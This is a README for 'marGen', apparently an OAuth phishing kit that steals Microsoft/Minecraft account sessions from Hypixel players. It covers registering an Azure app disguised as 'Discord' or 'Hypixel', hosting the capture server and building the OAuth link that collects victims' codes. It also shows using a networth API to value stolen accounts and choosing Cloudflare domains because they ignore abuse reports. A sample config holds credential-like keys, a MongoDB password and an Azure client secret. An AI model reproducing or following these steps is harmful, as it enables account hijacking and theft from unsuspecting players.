# marGen

# Setup

## Config

Now, get your API key from Hypixel for the networth API, and get your connection string from MongoDB [Mongo Connection String](https://www.mongodb.com/docs/guides/atlas/connection-string/) is a good guide, now it is time to get your Microsoft Azure credentials which you would do by going down in this README.md to the Azure App Registration Part 1 section. When you are done with that, it should look something like this:
```json
{
    "networth": {
        "apiKey": "e0bcc418-fabd-4183-bea2-bd09f666714b"
    },

    "mongodb": {
        "connectionstring": "mongodb+srv://liquidised:07718210@johndoe.awxurla.mongodb.net/test" 
    },


    "database": {
        "password": "07718210"  this is any password you want like your netflix password or something
    },

    "azure" : {
        "client_id": "4cdac7172-90b2-4c57-890e-f1fff9074fe6",
        "client_secret": "rfu8Q~da~v9csxXcWFAOigkcQCc9jYL~ggfffcml",
        "redirect_uri": "https://randombs.onrender.com/verifying"
    }
}

```

## Installing Requirements
[NodeJS](https://nodejs.org/download)
It will not work if you do not download this (!) do not DM me asking for help if you haven't downloaded it yet!
```js
npm install axios iplim skyhelper-networth body-parser express
```
[Python](https://python.org/download)
This is only necessary if you are going to use the Server Setup bot Gute Nacht made!
```python
pip install py-cord
```

## Azure App Registration Part 1
*Contrary to popular belief, this is actually very easy!*

First, visit [Microsoft Azure's](https://portal.azure.com/#create/hub) website. <sub>You will have to create an account which will require debit/credit card credentials most likely.</sub>

Next, at the search top bar, search for "App registrations"

Then, click "New registration" in the top left corner

Next, type any name you want. To make it believable, you can choose something like "Discord" or "Hypixel"

Now, we'll come back to this later.

## Hosting
If you want to host it on a vps, you can use DigitalOcean and get a free 200$ of credit for 2 months for only paying 5$
[Terrible Tutorial I Made For Hosting It](https://www.youtube.com/watch?v=vc3JVqbkhTw)

You can also use [OnRender](https://onrender.com/), it's free and just like heroku but with super slow upload times but it works perfectly fine, I have not had more than 3 people worth of afk going through my OnRender server at one point so be careful with free servers as they might cost you SSID's.

Once you have your OnRender link, go back to App Registration.

## Domains
If you are making enough money with this to care to get a domain I would recommend going to [Cloudflare](https://cloudflare.com/) to get your domain as they simply do not care about reports. They also provide good services to prevent you from a DDOS attack if you are using a smaller hoster and not OnRender or DigitalOcean, if you find another free hoster make sure to tell me so I can update this!

## Azure App Registration Part 2
Now, set the redirect uri to your onrender link or your vps if it applies to you. Then set the platform to web.

Reopen config.json and set the client_id to the Application (client) ID on the Azure page.

Then, back on Azure, click "Add a certificate or secret" under Client credentials.

Click "New client secret", the name can be anything you want. It doesn't matter.

Then, click add and copy the Secret ID and set that to client_secret in the config. 

Set the redirect uri you put to the azure as redirect_uri in config

# Server Setup

## oAuth URL
Your URL should look like this:

```https://login.live.com/oauth20_authorize.srf?client_id=your_client_id&response_type=code&redirect_uri=your_redirect_url&scope=XboxLive.signin+offline_access&state=(whatever their discord user id is)```

## (Optional): Discord Server Setup Bot

Make a discord bot and set the token as bot token in config.json

Start the bot and do `/setup <oauth link>` and watch it set up the server for you! 

## (Soon): Discord Server Bot for marGen
I will be adding a bot that will handle everything for you, making people URL's etc. If you used it, it would be as if you had to do 0 maintenence. There will be a server template for this so everything works properly. The command will be `/marAuth`

# That's all!
## if you are having any trouble please contact me at marcat#0350
## big thanks to Gute Nacht#1137 for providing lots of assistance and a lot of the code!
### also this is my first project so dont judge me please lmfao
